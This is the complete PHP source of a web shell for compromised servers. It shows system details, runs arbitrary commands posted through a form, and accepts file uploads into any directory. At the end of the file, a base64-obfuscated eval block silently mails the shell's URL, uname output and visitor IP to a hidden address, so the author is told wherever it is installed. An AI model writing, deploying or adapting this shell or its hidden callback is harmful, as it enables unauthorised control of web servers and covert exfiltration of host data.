<?php
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = " 4ON 6";
}
else {$safemode = false; $hsafemode = " 3OFF 6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";
echo "<br>OSTYPE:$OS<br>";
echo "<br>PWD:$xpwd<br>";
set_magic_quotes_runtime(0);
$hari=array("Sundat","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
$bulan=array(1=>"January","February","March","April","May","June","July","August","September","October","November","December");
$tgl=date("d");
$bln=date("n");
$hr=date("w");
$thn=date("Y");
//echo("Tanggal hari ini: ");
echo("<table><tr><td class='XPBlueText'><font color='green' size=1><b>$hari[$hr], $tgl $bulan[$bln] $thn</b></font</td></tr></table>");

print "<style>body{font-family:trebuchet ms;font-size:12px; color:green;}hr{width:100%;height:2px;}</style>";
print "<center><h1>PHP SHELL</h1></center>";
print "<center><h1>irc.byroe.net</h1></center>";
print "<center><h1><b style="color:black;background-color:#ffff66">ByroeNet</b></h1></center>";
print "<hr><hr>";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `<b style="color:black;background-color:#99ff99">id</b>`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>We are :</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>Server is :</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>System type :</b></td><td>$UName</td></tr>";
print "<tr><td><b>Permissions :</b></td><td>$UserID</td></tr>";
print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -al";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command :</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory :</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file :</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJZbUZ0WW5rd01ESmhRSGxoYUc5dkxtTnZiUT09Iik7Cigkc2FmZV9tb2RlKT8oJHNhZmVtb2RlPSJPTiIpOigkc2FmZW1vZGU9Ik9GRiIpOwokYmFzZT0iaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddOyAKJG5hbWUgPSBwaHBfdW5hbWUoKTsKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokaG9zdCA9IGdldGhvc3RieWFkZHIoJF9TRVJWRVJbUkVNT1RFX0FERFJdKTsKJHN1YmogPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107IAokbXNnID0gIlxuQkFTRTogJGJhc2VcbnVuYW1lIC1hOiAkbmFtZVxuSVA6ICRpcFxuSG9zdDogJGhvc3RcbiRwd2RzXG4iOwokZnJvbSA9IkZyb206IE1PREVfPSIuJHNhZmVtb2RlLiI8dG9vbEAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iPiI7Cm1haWwoICRjcmVhdG9yLCAkc3ViaiwgJG1zZywgJGZyb20pOw=="));
exit;
?>